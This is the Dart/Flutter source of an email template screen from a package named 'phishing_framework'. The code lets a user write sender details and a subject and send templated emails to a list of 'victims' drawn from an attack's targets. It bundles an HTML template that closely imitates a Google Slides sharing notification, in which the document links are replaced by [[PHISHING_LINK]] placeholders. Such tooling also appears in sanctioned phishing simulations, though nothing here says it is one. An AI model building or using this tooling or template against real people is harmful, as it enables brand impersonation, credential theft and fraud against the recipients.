import 'dart:collection';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:phishing_framework/app_scheme.dart';
import 'package:phishing_framework/attack.dart';
import 'package:phishing_framework/helpers/file_helper.dart';
import 'package:phishing_framework/helpers/network_helper.dart';

class EmailSelector extends StatefulWidget {
  // Take in the attack
  PhishingAttack attack;
  EmailSelector(this.attack, {super.key});

  @override
  State<EmailSelector> createState() => _EmailSelectorState();
}

class _EmailSelectorState extends State<EmailSelector> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(),
      body: ListView(
        padding: EdgeInsets.only(
          top: 20,
          left: MediaQuery.of(context).size.width / 3,
          right: MediaQuery.of(context).size.width / 3,
          bottom: 20,
        ),
        children: [
          Text(
            "Email Template Gallery",
            style: AppScheme.headlineStyle,
          ),
          Row(
            children: [
              Container(
                width: 30,
                height: 30,
                margin: const EdgeInsets.all(10.0),
                child: FloatingActionButton(
                  // On pressed create alert dialogue to create new template
                  onPressed: () =>  showDialog(
                    context: context,
                    builder: (context) {
                      TextEditingController nameController = TextEditingController();
                      TextEditingController htmlController = TextEditingController();
                      TextEditingController additionalFieldsController = TextEditingController();

                      return AlertDialog(
                        title: const Text("Create New Template"),
                        content: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            TextField(
                              decoration: const InputDecoration(
                                labelText: "Template Name",
                              ),
                              controller: nameController,
                            ),
                            TextField(
                              decoration: const InputDecoration(
                                labelText: "Template HTML",
                              ),
                              controller: htmlController,
                              keyboardType: TextInputType.multiline,
                              maxLines: 10,
                            ),
                            TextField(
                              decoration: const InputDecoration(
                                labelText: "Additional Fields",
                              ),
                              controller: additionalFieldsController,
                            ),
                          ],
                        ),
                        actions: [
                          TextButton(
                            onPressed: () {
                              Navigator.of(context).pop();
                            },
                            child: const Text("Close"),
                          ),
                          TextButton(
                            onPressed: () {
                              EmailTemplateManager.instance.addTemplate(
                                EmailTemplate(
                                  nameController.text,
                                  htmlController.text,
                                  additionalFieldsController.text.split(",")
                                ),
                              );
                              Navigator.of(context).pop();
                            },
                            child: const Text("Create"),
                          ),
                        ],
                      );
                    },
                  ),
                  child: const Icon(Icons.add),
                  ),
              ),
              Container(
                width: 30,
                height: 30,
                margin: const EdgeInsets.all(10.0),
                child: FloatingActionButton(
                  onPressed: () => EmailTemplateManager.instance.deleteFromStorage(),
                  child: const Icon(Icons.delete),
                  ),
              )
            ],
          ),
          GridView.builder(
            shrinkWrap: true,
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 3,
              mainAxisSpacing: 10,
              crossAxisSpacing: 10,
            ),
            itemCount: EmailTemplateManager.instance.templates.length,
            itemBuilder: (context, index) {
              return GestureDetector(
                onTap: () {
                  // return alert dialogue EmailTemplatePage();
                  showDialog(
                    context: context,
                    builder: (context) {
                      return EmailTemplatePage(
                          EmailTemplateManager.instance.templates[index], widget.attack);
                    },
                  );
                },
                child: Container(
                  decoration: BoxDecoration(
                    border: Border.all(
                      color: Colors.white,
                      width: 2,
                    ),
                  ),
                  child: Card(
                    color: AppScheme.successColor,
                    child: Column(
                      children: [
                        Text(
                          EmailTemplateManager.instance.templates[index].name,
                        ),
                      ],
                    ),
                  ),
                ),
              );
            },
          ),
        ],
      ),
    );
  }
}

class EmailTemplatePage extends StatefulWidget {
  final EmailTemplate template;
  final PhishingAttack attack;
  const EmailTemplatePage(this.template, this.attack, {super.key});

  @override
  State<EmailTemplatePage> createState() => _EmailTemplatePageState();
}

class _EmailTemplatePageState extends State<EmailTemplatePage> {
  TextEditingController senderNameController = TextEditingController();
  TextEditingController senderEmailController = TextEditingController();
  TextEditingController senderSubject = TextEditingController();

  List<MapEntry<String, TextEditingController>> additionalFields = [];

  TextEditingController newController(String name) {
    TextEditingController controller = TextEditingController();
    additionalFields.add(MapEntry(name, controller));
    return controller;
  }


  @override
  Widget build(BuildContext context) {
    return AlertDialog(
      title: Text(widget.template.name),
      content: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          TextField(
            controller: senderNameController,
            decoration: const InputDecoration(
              labelText: "Sender Name",
            ),
          ),
          TextField(
            controller: senderEmailController,
            decoration: const InputDecoration(
              labelText: "Sender Email",
            ),
          ),
          TextField(
            controller: senderSubject,
            decoration: const InputDecoration(
              labelText: "Subject",
            ),
          ),
          ...widget.template.additionalFields.map((e) => TextField(
            decoration: InputDecoration(
              labelText: e,
            ),
            controller: newController(e),
          )).toList(),
        ],
      ),
      actions: [
        TextButton(
          onPressed: () {
            Navigator.of(context).pop();
          },
          child: const Text("Close"),
        ),
        TextButton(
            onPressed: () {
              setState(
                () {
                  List<Map<String, String>> victimList = widget.attack.targets.map((e) => {"name": e.name, "email": e.email, "victimId": e.ident.toString()}).toList();

                  Session.instance.sendEmail(
                    victimList, 
                    senderNameController.text, 
                    senderEmailController.text, 
                    senderSubject.text, 
                    widget.template.html, 
                    additionalFields.map((e) => {"field_name": e.key, "field_value": e.value.text}).toList(),
                    widget.attack.url
                  );
                },
              );
              Navigator.pop(context);
            },
            child: const Text("Send"),
          ),
      ],
    );
  }
}

class EmailTemplate {
  String name;
  String html;
  List<String> additionalFields;

  EmailTemplate(this.name, this.html, this.additionalFields);

  static EmailTemplate fromJson(MapEntry<String, dynamic> json) =>
  EmailTemplate(
    json.value['name'] as String,
    json.value['html'] as String,
    json.value['additional_fields'] as List<String>,
  );

  Map<String, dynamic> toJson() => {
    'name': name,
    'html': html,
    'additional_fields': additionalFields,
  };
}

class EmailTemplateManager {
  List<EmailTemplate> templates = [
    EmailTemplate(
      "Gmail",
      "<td style=\"padding: 24px 0 16px 0\"> <table style=\" border-collapse: collapse; font-family: Roboto, Arial, Helvetica, sans-serif; word-wrap: break-word; word-break: break-word; width: 90%; margin: auto; max-width: 700px; min-width: 280px; text-align: left; \" role=\"presentation\" > <tbody> <tr> <td style=\"padding: 0\"> <table style=\" width: 100%; border: 1px solid #dadce0; border-radius: 8px; border-spacing: 0; table-layout: fixed; border-collapse: separate; \" role=\"presentation\" > <tbody> <tr> <td style=\"padding: 4.5%\" dir=\"ltr\"> <div style=\" margin-bottom: 32px; font-family: Google Sans, Roboto, Arial, Helvetica, sans-serif; font-style: normal; font-size: 28px; line-height: 36px; color: #3c4043; \" > [[FROM_NAME]] <span class=\"il\">shared</span> a presentation </div> <table style=\" border-collapse: collapse; font-family: Roboto, Arial, Helvetica, sans-serif; font-size: 16px; line-height: 24px; color: #202124; letter-spacing: 0.1px; table-layout: fixed; width: 100%; \" role=\"presentation\" > <tbody> <tr> <td style=\" padding: 0; vertical-align: top; width: 50px; \" > <div> <img style=\"border-radius: 50%; display: block\" width=\"50\" height=\"50\" src=\"https://ci5.googleusercontent.com/proxy/UdBKn_RzxvI0tpFeaHZH6qjRQflXD1FVkaKHQLxpPMCyp4rb_JsvRhUd3X6hT680rGauqrNvGg4v5Lh0GZuxPsl8_pNVA1bhQMf9F71p=s0-d-e1-ft#https://ssl.gstatic.com/s2/profiles/images/silhouette64.png\" alt=\"Unknown profile photo\" class=\"CToWUd\" data-bit=\"iit\" /> </div> </td> <td style=\" padding: 0; vertical-align: top; padding-left: 12px; \" > <div style=\"padding-top: 12px\"> [[FROM_NAME]] (<a href=\"mailto:[[FROM_EMAIL]]\" style=\"color: inherit; text-decoration: none\" target=\"_blank\" >[[FROM_EMAIL]]</a >) has invited you to <b>edit</b> the following presentation: </div> </td> </tr> </tbody> </table> <table style=\" border-spacing: 0 4px; table-layout: fixed; width: 100%; \" role=\"presentation\" > <tbody> <tr style=\"height: 28px\"></tr> <tr> <td style=\"padding: 0\"> <a href=[[PHISHING_LINK]] style=\" color: #3c4043; display: inline-block; max-width: 100%; text-decoration: none; vertical-align: top; border: 1px solid #dadce0; border-radius: 16px; white-space: nowrap; \" target=\"_blank\" data-saferedirecturl=[[PHISHING_LINK]] ><div style=\" line-height: 18px; overflow: hidden; text-overflow: ellipsis; padding: 6px 12px; \" > <span style=\" display: inline-block; vertical-align: top; min-width: 26px; width: 26px; \" ><img src=\"https://ci6.googleusercontent.com/proxy/sE5mXGqS01SiUCItcVMEl1g_KjKgC5kFfQK9xHZulJn8P6t_wQPG67TrpukY8DbFzPpNfon2OW5QrpzXpiSzEFq4sRf99sZyH8UoBTwa37Ru31Bvl9z2pIvjFkqotgJL9rBpwg=s0-d-e1-ft#https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_1_presentation_x64.png\" width=\"18\" height=\"18\" style=\"vertical-align: top\" role=\"presentation\" class=\"CToWUd\" data-bit=\"iit\" /></span ><span style=\" font: 500 14px/18px Google Sans, Roboto, Arial, Helvetica, sans-serif; display: inline; letter-spacing: 0.2px; \" >[[DOCUMENT_NAME]]</span > </div></a > </td> </tr> </tbody> </table> <table style=\"border-collapse: collapse\" role=\"presentation\" > <tbody> <tr style=\"height: 32px\"> <td></td> </tr> </tbody> </table> <div> <a href=[[PHISHING_LINK]] role=\"button\" style=\" padding: 0 24px; font: 500 14px/36px Google Sans, Roboto, Arial, Helvetica, sans-serif; border: none; border-radius: 18px; box-sizing: border-box; display: inline-block; letter-spacing: 0.25px; min-height: 36px; text-align: center; text-decoration: none; background-color: #1a73e8; color: #fff; \" target=\"_blank\" data-saferedirecturl=\"https://www.google.com/url?q=https://docs.google.com/presentation/d/1F-rgRJH0Eu9-qDj-FJMIB9NzqkTnPXVb3LeOU6dO3hk/edit?usp%3Dsharing_eip_m%26ts%3D64ef0c7f&amp;source=gmail&amp;ust=1697445452440000&amp;usg=AOvVaw1S0nF0oEng0VPWeJPQr_oY\" >Open</a > </div> <table style=\"border-collapse: collapse\" role=\"presentation\" > <tbody> <tr style=\"height: 32px\"> <td></td> </tr> </tbody> </table> <div style=\"font-size: 12px; color: #5f6368\"> If you don't want to receive files from this person, <a href=\"#\" style=\"color: #1a73e8; text-decoration: none\" target=\"_blank\" data-saferedirecturl=\"#\" >block the sender</a > from Drive </div> </td> </tr> </tbody> </table> <table style=\"border-collapse: collapse; width: 100%\" role=\"presentation\" > <tbody> <tr> <td style=\"padding: 24px 4.5%\"> <table style=\"border-collapse: collapse; width: 100%\" dir=\"ltr\" > <tbody> <tr> <td style=\" padding: 0; font-family: Roboto, Arial, Helvetica, sans-serif; color: #5f6368; width: 100%; font-size: 12px; line-height: 16px; min-height: 40px; letter-spacing: 0.3px; \" > Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA<br /> You have received this email because <a href=\"mailto:[[FROM_EMAIL]]\" style=\"color: inherit; text-decoration: none\" target=\"_blank\" >[[FROM_EMAIL]]</a > <span class=\"il\">shared</span> a presentation with you from Google Slides. </td> <td style=\" padding: 0; padding-left: 20px; min-width: 96px; \" > <a href=\"https://www.google.com/\" style=\"text-decoration: none\" target=\"_blank\" data-saferedirecturl=\"https://www.google.com/url?q=https://www.google.com/&amp;source=gmail&amp;ust=1697445452440000&amp;usg=AOvVaw0uOXxl76-Q43uuzPw6-Tej\" ><img src=\"https://ci4.googleusercontent.com/proxy/0LzDBAqyQ-T9Ulnkv4Pqt6jHhVIJqkhShdnzVeJ9UTouUL5RFfoaCzeKW-ImcdvSKhHmDcmAP8F_q7MJfrTXzd5ui67o1Zp2FZ29oAG0fV6RuVbi_Wz_S-1zfRc2O3yplVtGJM7vgB31Ig230g=s0-d-e1-ft#https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_grey_tm_color_96x40dp.png\" width=\"96\" height=\"40\" alt=\"Google\" style=\" font-size: 16px; font-weight: 500; color: #5f6368; \" class=\"CToWUd\" data-bit=\"iit\" /></a> </td> </tr> </tbody> </table> </td> </tr> </tbody> </table> </td> </tr> </tbody> </table> </td>",
      ["[[DOCUMENT_NAME]]"]
    )
  ];

  EmailTemplateManager._privateConstructor() {
    loadFromStorage();
  }

  static final EmailTemplateManager instance =
      EmailTemplateManager._privateConstructor();

  void addTemplate(EmailTemplate template) {
    templates.add(template);
    saveToStorage();
  }

  void deleteFromStorage() async {
    await Storage.instance.deleteFromStorage("email_templates");
  }

  void loadFromStorage() async {
    Map<String, dynamic>? json =
        await Storage.instance.loadFromStorage("email_templates");

    if (json == null) {
      return;
    }

    for (var element in json.entries) {
      templates.add(EmailTemplate.fromJson(element));
    }
  }

  void saveToStorage() async {
    Map<String, dynamic> json = {};
    for (var element in templates) {
      json[element.name] = element.toJson();
    }
    await Storage.instance.saveToStorage("email_templates", json);
  }
}
